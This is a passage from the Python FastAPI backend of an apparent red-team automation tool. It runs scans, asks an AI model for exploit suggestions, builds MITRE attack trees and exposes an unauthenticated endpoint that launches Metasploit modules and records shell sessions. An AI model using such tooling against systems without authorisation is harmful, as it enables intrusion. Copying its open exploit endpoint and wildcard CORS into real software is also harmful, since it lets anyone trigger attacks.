            scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
            
            result = await run_tool(tool_id, target)
            scan_progress[scan_id]["results"][tool_id] = result
            completed += 1
        
        # AI Analysis
        scan_progress[scan_id]["current_tool"] = "kimi_ai_analysis"
        scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
        
        ai_result = await analyze_with_kimi(scan_progress[scan_id]["results"], target, phases)
        scan_progress[scan_id]["ai_analysis"] = ai_result["analysis"]
        scan_progress[scan_id]["exploits"] = ai_result.get("exploits", [])
        
        # Build attack tree
        attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], phases, ai_result)
        scan_progress[scan_id]["attack_tree"] = attack_tree
        attack_trees[scan_id] = attack_tree
        
        scan_progress[scan_id]["status"] = "completed"
        scan_progress[scan_id]["progress"] = 100
        scan_progress[scan_id]["current_tool"] = None
        
        # Save to database
        await db.scans.insert_one({
            "id": scan_id, "target": target, "status": "completed",
            "phases": phases, "tools_used": tools_to_run,
            "results": scan_progress[scan_id]["results"],
            "ai_analysis": scan_progress[scan_id]["ai_analysis"],
            "exploits": scan_progress[scan_id]["exploits"],
            "attack_tree": attack_tree,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "updated_at": datetime.now(timezone.utc).isoformat()
        })
        
    except Exception as e:
        logger.error(f"Scan error: {str(e)}")
        scan_progress[scan_id]["status"] = "error"
        scan_progress[scan_id]["error"] = str(e)

# =============================================================================
# API ROUTES
# =============================================================================
@api_router.get("/")
async def root():
    return {"message": "Red Team Automation Framework", "version": "3.0.0", "mitre_tactics": len(MITRE_TACTICS)}

@api_router.get("/mitre/tactics")
async def get_mitre_tactics():
    return {"tactics": MITRE_TACTICS}

@api_router.get("/mitre/tactics/{tactic_id}")
async def get_tactic_techniques(tactic_id: str):
    tactic = MITRE_TACTICS.get(tactic_id)
    if not tactic:
        raise HTTPException(status_code=404, detail="Tactic not found")
    return tactic

@api_router.get("/tools")
async def get_tools(phase: str = None):
    if phase:
        tools = {k: v for k, v in RED_TEAM_TOOLS.items() if v["phase"] == phase}
    else:
        tools = RED_TEAM_TOOLS
    return {"tools": tools, "count": len(tools)}

@api_router.post("/scan/start")
async def start_scan(scan: ScanCreate, background_tasks: BackgroundTasks):
    scan_id = str(uuid.uuid4())
    target = scan.target.strip().replace("https://", "").replace("http://", "").split("/")[0]
    
    if not target:
        raise HTTPException(status_code=400, detail="Target required")
    
    background_tasks.add_task(run_scan_background, scan_id, target, scan.scan_phases, scan.tools)
    
    return {"scan_id": scan_id, "target": target, "phases": scan.scan_phases, "status": "started"}

@api_router.get("/scan/{scan_id}/status")
async def get_scan_status(scan_id: str):
    if scan_id in scan_progress:
        p = scan_progress[scan_id]
        return {
            "scan_id": scan_id, "status": p["status"], "current_tool": p["current_tool"],
            "progress": p["progress"], "results": p["results"],
            "ai_analysis": p.get("ai_analysis"), "exploits": p.get("exploits", []),
            "attack_tree": p.get("attack_tree")
        }
    
    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
    if scan:
        return {
            "scan_id": scan_id, "status": scan["status"], "current_tool": None,
            "progress": 100, "results": scan.get("results", {}),
            "ai_analysis": scan.get("ai_analysis"), "exploits": scan.get("exploits", []),
            "attack_tree": scan.get("attack_tree")
        }
    
    raise HTTPException(status_code=404, detail="Scan not found")

@api_router.get("/scan/{scan_id}/tree")
async def get_attack_tree(scan_id: str):
    if scan_id in attack_trees:
        return attack_trees[scan_id]
    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
    if scan and "attack_tree" in scan:
        attack_trees[scan_id] = scan["attack_tree"]
        return scan["attack_tree"]
    raise HTTPException(status_code=404, detail="Attack tree not found")

@api_router.put("/scan/{scan_id}/tree/node/{node_id}")
async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus):
    if scan_id not in attack_trees:
        scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
        if scan and "attack_tree" in scan:
            attack_trees[scan_id] = scan["attack_tree"]
        else:
            raise HTTPException(status_code=404, detail="Attack tree not found")
    
    tree = attack_trees[scan_id]
    
    if node_id == "root":
        tree["root"]["status"] = update.status
        if update.notes:
            tree["root"]["notes"] = update.notes
    elif node_id in tree["nodes"]:
        tree["nodes"][node_id]["status"] = update.status
        if update.notes:
            tree["nodes"][node_id]["notes"] = update.notes
    else:
        raise HTTPException(status_code=404, detail="Node not found")
    
    await db.scans.update_one({"id": scan_id}, {"$set": {"attack_tree": tree, "updated_at": datetime.now(timezone.utc).isoformat()}})
    return {"message": "Node updated", "node_id": node_id, "status": update.status}

@api_router.post("/scan/{scan_id}/tree/node")
async def add_tree_node(scan_id: str, node: AddNodeRequest):
    if scan_id not in attack_trees:
        scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
        if scan:
            attack_trees[scan_id] = scan["attack_tree"]
        else:
            raise HTTPException(status_code=404, detail="Scan not found")
    
    tree = attack_trees[scan_id]
    new_node_id = f"custom_{uuid.uuid4().hex[:8]}"
    
    new_node = {
        "id": new_node_id, "parent_id": node.parent_id, "type": node.type,
        "name": node.name, "description": node.description, "status": "pending",
        "severity": node.severity, "mitre": node.mitre_id, "data": node.data, "children": []
    }
    
    tree["nodes"][new_node_id] = new_node
    
    if node.parent_id == "root":
        tree["root"]["children"].append(new_node_id)
    elif node.parent_id in tree["nodes"]:
        tree["nodes"][node.parent_id]["children"].append(new_node_id)
    
    await db.scans.update_one({"id": scan_id}, {"$set": {"attack_tree": tree}})
    return {"message": "Node added", "node": new_node}

@api_router.post("/metasploit/execute")
async def execute_metasploit(exploit: ExploitExecute):
    result = await run_metasploit(
        exploit.module, exploit.target_host, exploit.target_port,
        exploit.options, exploit.lhost, exploit.lport
    )
    
    if exploit.scan_id and exploit.node_id and exploit.scan_id in attack_trees:
        tree = attack_trees[exploit.scan_id]
        if exploit.node_id in tree["nodes"]:
            tree["nodes"][exploit.node_id]["status"] = "success" if result.get("success") else "failed"
            tree["nodes"][exploit.node_id]["data"]["exploit_result"] = result
            
            if result.get("session_opened"):
                session_id = f"session_{uuid.uuid4().hex[:8]}"
                tree["nodes"][session_id] = {
                    "id": session_id, "parent_id": exploit.node_id, "type": "access",
                    "name": "SESSION OBTAINED", "description": f"Meterpreter/Shell via {exploit.module}",
                    "status": "success", "severity": "critical", "mitre": "T1059",
                    "data": {"session": True}, "children": []
                }
                tree["nodes"][exploit.node_id]["children"].append(session_id)
            
            await db.scans.update_one({"id": exploit.scan_id}, {"$set": {"attack_tree": tree}})
    
    return result

@api_router.get("/metasploit/modules")
async def get_metasploit_modules(query: str = "", category: str = "", mitre: str = ""):
    modules = METASPLOIT_MODULES
    
    if category:
        modules = [m for m in modules if m["category"] == category]
    if mitre:
        modules = [m for m in modules if m.get("mitre", "") == mitre]
    if query:
        modules = [m for m in modules if query.lower() in m["name"].lower() or query.lower() in m["desc"].lower()]
    
    return {"modules": modules, "count": len(modules)}

@api_router.get("/scan/history")
async def get_scan_history():
    scans = await db.scans.find({}, {"_id": 0, "id": 1, "target": 1, "status": 1, "phases": 1, "created_at": 1}).sort("created_at", -1).to_list(100)
    return scans

@api_router.get("/scan/{scan_id}/report")
async def get_scan_report(scan_id: str):
    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")
    return {"report": scan, "generated_at": datetime.now(timezone.utc).isoformat()}

@api_router.delete("/scan/{scan_id}")
async def delete_scan(scan_id: str):
    result = await db.scans.delete_one({"id": scan_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Scan not found")
    if scan_id in scan_progress:
        del scan_progress[scan_id]
    if scan_id in attack_trees:
        del attack_trees[scan_id]
    return {"message": "Scan deleted"}

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
